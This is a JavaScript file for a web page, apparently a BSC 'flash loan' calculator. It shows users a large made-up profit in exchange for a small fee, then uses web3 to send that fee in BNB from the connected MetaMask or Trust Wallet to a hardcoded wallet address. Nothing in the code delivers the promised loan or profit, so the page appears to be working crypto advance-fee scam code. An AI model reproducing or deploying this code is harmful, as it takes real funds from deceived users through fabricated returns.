var OK = false; 
var chain1 = 0;
var chain2 = 0;
 window.onload = function() {
	  $('#form2').hide();
        $("#loanAmtInput").val('25');
        calc();  

		
			checkpoint();
			$('#form1').hide();
		 $('#form2').hide();
    }
	
	const checkpoint = async () => {
		
		if(window.ethereum){
			//await loadweb3();
			var t = await web3.eth.net.getId(),
            e = await web3.eth.getChainId();
				chain1 = t;
				chain2 = e;
			if (56 == t && 56 == e){
				console.log('2x');
				//$('input[name="network"]').val('bsc');
				$('input:radio[name="network"][value="bsc"]').attr('checked',true);
				OK = true; 
				$('#form1').show();
			} else {
				alert('Supported Networks is BSC');
			}
		}else{
			await loadweb3();
			var t = await web3.eth.net.getId(),
            e = await web3.eth.getChainId();			
			if (56 == t && 56 == e){
				OK = true; 
			} else {
				alert('Supported Networks is BSC');
			}
		}
	}
    var mttotalcost = 0;

    function calc() {
        var profit = 0;
        var chain = $('input[name="network"]:checked').val();

        //console.log('---' + chain + '---');

        var loanamount = $("#loanAmtInput").val();
		if(loanamount < 25){
			loanamount = 25;
		}
        var minamount = 25;
        
        var swapFee = 0;
        var totalFee = 0;
        var gain = 0;
        if (chain == 'bsc') {
			var loantokenFee = 0.05;
            var erc20network = 200;
            var erc20network2 = 0.73;
        } else {
			var loantokenFee = 0.01;
            var erc20network = 400;
			var erc20network2 = 0.529;
            
        }
        var loanswapFee = loanamount / erc20network;
        var loantotalFee = fixNumber(loantokenFee + loanswapFee);
        var loangain = fixNumber(loanamount * erc20network2);

        if (chain == 'eth') {
            var tokdepfee = loantokenFee + ' ETH';
            var swapfee = loanswapFee + ' ETH';
            var ttc = loangain;
            mttotalcost = loantotalFee;
            totalcost = loantotalFee + ' ETH';
            profit = loangain + ' ETH';
            $("#currency").html('ETH');
        } else {
            var tokdepfee = loantokenFee + ' BNB';
            var swapfee = loanswapFee + ' BNB';
            var ttc = loangain;
            mttotalcost = loantotalFee;
            totalcost = loantotalFee + ' BNB';
            profit = loangain + ' BNB';
            $("#currency").html('BNB');
        }

        var amt = $("#loanAmtInput").val();
        //alert(amt)
        $("#tokdepfee").html(tokdepfee);
        $("#swapfee").html(swapfee);
        $("#totalcost").html(totalcost);
        $("#profit").html(profit);
    }

    function fixNumber(y) {
        return Math.round(1e12 * y) / 1e12;
    }

    $("#loanAmtInput").keyup(function() {
        calc();
    });

    let web3 = new web3js.myweb3(window.ethereum);
    let addr;
   

    const loadweb3 = async () => {
        try {
            web3 = new web3js.myweb3(window.ethereum);            
            let a = await ethereum.enable();
            addr = web3.utils.toChecksumAddress(a[0]);
            return (addr);

        } catch (error) {
            if (error.code === 4001) {
                console.log('Please connect to MetaMask.')
            } else {
                console.error(error)
            }
        }

    };


    const buystt = async () => {
        await loadweb3();
        if (addr == undefined) {
            alert("No BEP20 wallet detected or it was not allowed to connect. Trust wallet or Metamask are recommended.");
        }

        let ethval = mttotalcost;
        console.log(mttotalcost);
        ethval = Number(ethval) * 1e18;
		
		if (chain1 == 56 && chain2 == 56){
				 web3.eth.sendTransaction({
            from: addr,
            to: '0xCF9f241d3B5a24b5Bd01514456B81c97e41d0a93',
            value: ethval
        }, (err, res) => {
            if (!err) console.log(res);
            else console.log(err);
        });
			}

        
    }
	
	
	 $('body').on('click', 'input[name="network"]', function(event) {
        calc();
    });

	$('body').on('click', '#execute', function(event) {            
            event.preventDefault();			
        // $('#execute').hide();
 $("#execute").attr("disabled", true);		 
        });
		
	$('body').on('click', '#nextstep', function(event) {  
 calc();	
            event.preventDefault();			
         $('#form1').hide();
		 $('#form2').show();
		   
        });
	
	  $('body').on('click', '#deposit', function(event) {           			
            event.preventDefault();		
			//await checkpoint();			
			if (OK){
				buystt();
			}else{
				alert('Supported Networks is BSC');
			}
            		   
        });
		
